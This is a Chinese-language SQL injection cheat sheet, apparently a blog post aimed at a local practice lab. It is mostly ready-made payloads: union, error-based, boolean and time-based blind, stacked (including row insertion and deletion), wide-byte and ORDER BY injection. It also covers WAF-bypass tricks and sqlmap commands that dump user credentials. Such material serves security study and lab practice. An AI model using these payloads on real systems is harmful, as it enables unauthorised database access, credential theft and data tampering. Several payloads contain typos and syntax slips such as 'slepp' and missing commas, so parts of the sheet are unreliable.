# SQL注入语句（详细）

### SQL注入原理

 

1. 参数用户可控：前端传递给后端的参数内容是用户可以控制的
2. 参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询

当传入的id参数为1' 时，数据库执行的代码如下

```sql
select * from users where id=1'
```

这不符合数据库语法规范，所以会报错。当传入的ID的参数为and 1=1时，执行的语句为

```sql
select * from users where id=1 and 1=1
```

因为1=1为真，且where语句中id=1也为真，所以页面返回id=1相同的结果。当传入ID参数为 and1=2,由于1=2不成立，所以返回假，页面就会返回与id=1不同的结果

### 一、联合查询

#### 1.判断注入点

```sql
#判断闭合符
?id=1\


#字符型判断
?id=1' and '1'='1   #页面运行正常

?id=1' and '1'='2   #页面运行不正常


#数字型判断 

?id=1 and 1=1 -- -  #页面运行正常

?id=1 and 1=2 -- -  #页面运行不正常


注入点注入符号 

引号型注入    '   单引号注入               "双引号注入

混合型注入    ')  单引号加括号注入   ")双引号加括号注入

括号注入      ）     括号注入
```

演示的是字符串注入，通过不同的结果返回，此网站可能存在[SQL注入漏洞](https://so.csdn.net/so/search?q=SQL注入漏洞&spm=1001.2101.3001.7020)

#### 2.查询字段

```sql
?id=1' 

?id=1' order by 3

?id=1' order by 4
```

order by查询的是改数据表的字段数量

访问id=1' order by 3结果与id=1结果相同，访问id=1' order by 4结果与id=1结果不相同

结论：字段数为3

#### 3.确定回显点

```sql
?id=-1' union select 1,2,3
```

根据字段数构造语句判断回显

#### 4.基础查询信息

```sql
#查询当前数据库

union select 1,database(),3   

#查询所有数据库

select group_concat(schema_name)  from  information_schema.schemata 

#查询指定数据库所有表数据

select group_concat(table_name)  from  information_schema.tables  where  table_schema='security'  

#查询指定数据库指定表的全部列数据

select group_concat(column_name) from information_schema.columns  where  table_schema='security'  and  table_name='users'

#查询指定数据库指定表的部分列数据

select column_name from information_schema.columns  where  table_schema='security'  and  table_name='users'  limit 0,1

#查询指定数据库指定表的指定列的字段值

select  group_concat(username,0x3a,password) from  security.users
```

### 二、报错注入

程序把错误信息输入到页面上，利用报错注入获取数据

```vbnet
' and updatexml(1,concat(0x7e,(select user()),0x7e),1)  -- +
```

#### 1.substr()函数

使用substr函数来一段段读取输出的内容

```sql
substr("123456",1,5)   #12345
```

#### 2.查询语句

查询语句与union注入相同，报错只显示一条结果

```sql
#获取 列的字段数

id=1' union select 1,2,3  #回显 you are in...

id=1' union select 1,2,3,4   

#回显 The used SELECT statements have a different number of columns     

#获取当前数据库库名

and updatexml(1,concat(0x7e,(select database()),0x7e),1)  -- +

#获取所有数据库库

and updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)--+

and updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),32,63),0x7e),1)--+

#获取指定数据库的所有表名

and updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,31),0x7e),1)--+

#获取指定数据库的指定表下的列数据

and updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.column where table_schema='security' and table_name='TKbvbxDK'),1,31),0x7e),1)--+

#获取指定数据库的指定表名指定列下的字段值

and updatexml(1,concat(0x7e,substring((select group_concat(id,0x3a,flag) from security.TKbvbxDK),64,95),0x7e),1)--+
```

### 三、布尔盲注

#### 1.length( )函数

判断数据库长度 length()

```vbnet
' and length(database())>=1 --+
```

#### 2.substr( )函数

```csharp
' and substr(database(),1,1)='t' -- +
```

#### 3.ord( )函数

ord()函数：转换为ascii码

```vbnet
' ord(substr(database(),1,1))=115 -- +
```

#### 4.查询语句

```sql
#判断数据库长度



and length(database())=8 --+



and length(database())>=9 --+



#指定字符一位一位判断截取到的字符



and substr(database(),1,1)='a' -- +



and substr(database(),2,1)='q' -- +



#使用ascii码比对截取到的字符



and ascii(substr(database()1,1))=114  -- +



and ascii(substr(database()1,1))=115  -- +



#查询表名



and substr((select  table_name  from  information_schema.tables  where  table_schema='security' limit 0,1 )='e'  -- +
```

### 四、时间盲注

> GET注入由于id值本身为真，判断注入点使用and运算符
>
> POST注入uname本身为假，判断注入点使用or运算符

**判断闭合方式**

```sql
and sleep(5)   -- -
```

**判断字段数目 3**

```sql
order  by  3



order  by  4
```

***\*if("表达式",条件1，条件2,) if(1=2,1,0)-->0\****

```sql
if(length(database())>=1,sleep(5),1)
```

#### 1.sleep( )延迟函数

sleep(5) #页面加载延迟5秒

```cobol
if(length(database())>=1,sleep(5),1)
```

#### 2.查询语句

```sql
#判断数据库名称

and if(length(database())=1,sleep(5),1)  -- - 

and if(length(database())=1,sleep(5),1)  -- - 

#使用subsre函数比对截取到的字符

and if(substr(database(),1,1)='s',sleep(5),1)  -- +

#使用ascii码比对截取到的字符

and if(ascii(substr(database(),1,1))=115,sleep(5),1)  -- +

#查询当前数据库下的表数据

and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=85,sleep(5),1 -- -

#查询当前数据库下的指定表数据的列数据

and if(ascii(substr((select column_name from information_schema.columns  where  table_schema='security'  and  table_name='8LPD9XiO'  limit 0,1),1,1))=105,slepp(5),1 -- -

#查询当前数据库下的指定表数据的列数据的字段值

and  if(ascii(substr((select  group_concat(id,0x3a,flag) from security.8LPD9XiO),1,1))=115,1,sleep(5)) --+
```

### 五、堆叠注入

```matlab
';select if(substr(user(),1,1)='r',sleep(3),1)%23
```

构造不同的时间注入语句，可以得到完整的数据库的库名，表名，字段名和具体数据

#### 1.查询语句

```sql
#获得MySQL当前用户

;select if(substr(user(),1,1)='r',sleep(3),1)%23

#获得数据库表名

;select if(substr((select  table_name  from  information_schema.tables  where  table_schema=database() limit 0,1),1,1)='e',sleep(3),1)%23
```

#### 2.使用联合注入

```sql
#判断注入点  单引号注入

?id=1'  and 1=1-- - 

?id=1'  and 1=2-- -

#判断字段数目  3

?id=1'  order by 3 -- - 

?id=1'  order by 4 -- - 

#判断回显位  2，3

?id=-1'  union select 1,2,3 -- - 

#查询当前数据库

?id=-1'  union select 1,database(),3 -- -

#查询当前数据库下所有表信息

?id=-1'  union select 1,(select  group_concat(table_name)  from  information_schema.tables  where  table_schema='security' ),3 -- - HTTP/1.1

#查询当前数据库下指定表下的列信息

?id=-1'  union select 1,(select group_concat(column_name) from information_schema.columns  where  table_schema='security'  and  table_name='users'),3 -- - HTTP/1.1
```

#### 3.使用堆叠注入向user中插入数据

```sql
#插入用户密码数据

?id=1';insert into users(id,username,password) values(66,'aiyou','bucuo') --+

#插入当前数据库数据

?id=1';insert into users(id,username,password) values(67,database(),'bucuo') --+

#查询当前数据库信息下方查询方式同等    ?id=67 


#插入查询所有表的所有数据，但数据仍显示不全

?id=1';insert into users(id,username,password) values(72,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 ) ,'buuck') --+

#插入当前数据库下的指定表数据

?id=1';insert into users(id,username,password) values(71,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 2,1) ,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 3,1)) --+

#插入当前数据库下的指定表数据的列数据

?id=1';insert into users(id,username,password) values(74,(select column_name from information_schema.columns where table_name="users" limit 13,1) ,(select column_name from information_schema.columns where table_name="users" limit 12,1)) --+

#删除数据

?id=1';delete from users where id=74 and sleep(if((select database())=0x7365637572697479,5,0));
```

### 六.宽字节注入

#### 1.查询语句

```sql
#判断是否存在注入

id=1%df' and 1=1%23

id=1%df' and 1=2%23

#查询字段数量   3

id=1%df' order by 3%23

id=1%df' order by 4%23  #Unknown column '4' in 'order clause'

#union注入

id=-1%df' union select 1,2,3%23

#查询当前数据库名

id=-1%df' union select 1,database(),3%23

#查询所有数据库

select group_concat(schema_name) from information_schema.schemata

#查询当前数据库部分表名

select table_name from information_schema.tables where table_schema=(select database()) limit 0,1

#查询当前数据库所有表名

select group_concat(table_name) from information_schema.tables where table_schema=(select database()) 

#查询指定数据库指定表名下的部分列名

select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1) limit 0,1

#查询指定数据库指定表名下的所有列名

select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)

#查询指定数据库指定表名下的所有列名的字段值

id=-1%df' union select  1,(select group_concat(id,flag) from security.GGXSsnCj),3%23
```

### 七.order by 后的注入

①直接注入语句，?sort=(select )

②利用一些函数。例如rand()函数等。?sort=rand(sql语句)

③利用and，例如?sort=1 and (sql语句)

④rand(true)和rand(false)结果是不一样的，可以利用这个性质注入

```sql
?sort=right(version(),1)
```

#### 1.使用报错注入

```sql
#查询当前用户



?sort=(select extractvalue(0x7e,concat(0x7e,user(),0x7e)))



#查询当前数据库



?sort=(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))



#查询当前数据库下的部分表数据



?sort=(select extractvalue(0x7e,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,31),0x7e)))



#查询当前数据库下的指定表的列数据



?sort=(select extractvalue(0x7e,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='TKbvbxDK'),1,31),0x7e)))
```

#### 2.使用rand(true)和rand(false)

```sql
?sort=rand(ascii(left(database(),1))=115)



?sort=rand(ascii(left(database(),1))=116)
```

#### 3.使用延迟注入

```sql
#查询当前数据库



?sort=1 and (if(length(database())>2,sleep(5),1) ) -- -



#查询当前数据库下的表数据



?sort=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=100, sleep(5), 1)-- +



#查询当前数据库下的指定表数据的列数据



?sort= 1 and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100, 0, sleep(5))-- +
```

#### 4.使用and

```sql
#查询当前数据库



?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)  -- +



#查询当前数据库下的表



?sort=1 and updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,31),0x7e),1)  -- +
```

### 重点：常见Waf绕过方式

#### 1.大小写绕过

and And or Or

#### 2.双写绕过

select -----seselectlect

and-----aandnd

union-----uunionnion

#### 3.编码绕过

Hex编码、URL编码、宽字节、Unicode编码

| 编码格式    | 编码形式                    |
| :---------- | :-------------------------- |
| URL编码     | %66%72%20%31%3d%31(and 1=1) |
| Unicode编码 | n%u0069on                   |

#### 4.空格绕过方法

/**/ 、 ()、+、%20、%09、%0a、0x0a、0x0b、0x0c、0x0d

#### 5.等价字符以及等价函数

and or xor 的过滤

1. and => &&
2. or => ||
3. xor => ^
4. not => !

#### 6.等价函数

hex()、 bin()==>ascii()

concat_ws()==>group_concat()

sleep()==>benchmark()

mid()、substr()==>substring()

@@user==user()

@datadir==datadir()

### 总结主要查询语句

```sql
#爆当前数据库



select 1,database(),3   



#爆所有数据库



select  group_concat(schema_name)  from  information_schema.schemata 



#爆所有表数据



select  group_concat(table_name)  from  information_schema.tables  where  table_schema='security'  



#爆部分表数据



select  table_name  from  information_schema.tables  where  table_schema='security' limit 0,1



#爆所有字段数据



select group_concat(column_name) from information_schema.columns  where  table_schema='security'  and  table_name='users'



#爆字段数据



select column_name from information_schema.columns  where  table_schema='security'  and  table_name='users'  limit 0,1



#爆字段值



select  group_concat(username,0x3a,password) from  security.users
```

### SQLMAP工具的使用

**第一步：判断是否存在注入点**

sqlmap.py -u "http://localhost/sql/Less-1/?id=1"

**第二步：查询数据库**

sqlmap.py -u "http://localhost/sql/Less-1/?id=1" --dbs

**第三步：查看当前数据库**

sqlmap.py -u "http://localhost/sql/Less-1/?id=1" --current-db

 **第四步：列出指定数据库的所有表**

sqlmap.py -u "http://localhost/sql/Less-1/?id=1" -D "security" --tables

**第五步：读取指定表中的字段名称**

sqlmap.py -u "http://localhost/sql/Less-1/?id=1" -D "security" -T users --colunms

 **第六步：读取指定字段内容**

sqlmap.py -u "http://localhost/sql/Less-1/?id=1" -D "security" -T users -C username,password --dump